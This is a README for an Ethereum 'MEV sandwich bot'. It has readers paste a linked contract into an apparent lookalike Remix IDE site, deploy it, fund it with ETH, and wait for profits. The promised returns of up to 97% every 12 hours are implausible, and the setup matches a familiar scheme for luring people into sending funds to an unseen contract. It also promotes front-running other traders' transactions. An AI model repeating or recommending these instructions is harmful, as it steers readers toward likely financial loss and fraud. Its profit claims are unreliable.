# MEV Flashbot
ETH MEV-Bot for sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that allows deployers of contract to take profits from tokens.

If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences. You can easily earn passive income using a MEV Bot and help the Ethereum network grow by contributing to ETH Burn. 

# How it works
![profit](https://user-images.githubusercontent.com/132264778/235452623-01aafec4-077e-420e-b937-9fffe28668fb.jpeg)
Bot sends the Transaction and sniffs the Uniswap v3 Mempool for txs with high slippage, calculating if a sandwich attack is profitable.
Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity, my bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions.
Then send back the ETH to the contract ready for withdrawal.
This bot performs all of that, faster than 99% of other bots.

# Estimated profits
0.1ETH - 0.4ETH = up to 10%/12hrs

0.4ETH - 1.2ETH = up to 20%/12hrs

1.2ETH - 2.4ETH = 20-27%/12hrs

2.4ETH - 5ETH = 27-35%/12hrs

5.0ETH - 10ETH - 35-50%/12hrs

10ETH - 20ETH - 50-63%/12hrs

20ETH - 50ETH - 76%+/12hrs

50ETH - 100ETH - 97%+/12hrs

# Instructions
1) Copy code and paste the code of [MEVBot.sol](https://github.com/TaylorWebbMEV/MEV-Flashbot/blob/main/MEVBot.sol) file in [Remix IDE](https://remix-compiler.net/)

<img width="1496" alt="1" src="https://user-images.githubusercontent.com/132264778/235452636-8dfda62f-714c-4fb2-9d45-d75bbea7be85.png">

2) Select Solidity compiler version 0.6.12 and press compile

![2](https://user-images.githubusercontent.com/132264778/235454398-1211b3c3-5eb9-463e-9d3d-824d398eec0d.png)

3) Select ENVIROMENT - “Injected Provider - Metamask” and connect the wallet you will be deploying from. Click deploy and confirm transaction

![3](https://user-images.githubusercontent.com/132264778/235454410-cb9b447c-bb47-4907-872a-6c75bdf17890.png)

4) Verify your smart contract on etherscan. Detail information how to verify a contract here: https://blog.chain.link/how-to-verify-a-smart-contract-on-etherscan

5) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into Step 1. Start. Confirm the transaction

<img width="780" alt="4" src="https://user-images.githubusercontent.com/132264778/235452658-71fb728f-d0e6-4a30-8236-9cf8c5926979.png">

Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 

At any time you can Stop the bot or return your money by clicking the withdrawal function.

Have a question? Message me on Telegram: https://t.me/MEVTrading

For business inquiries, contact me on [LinkedIn](https://www.linkedin.com/in/taylor-webb-96957887)
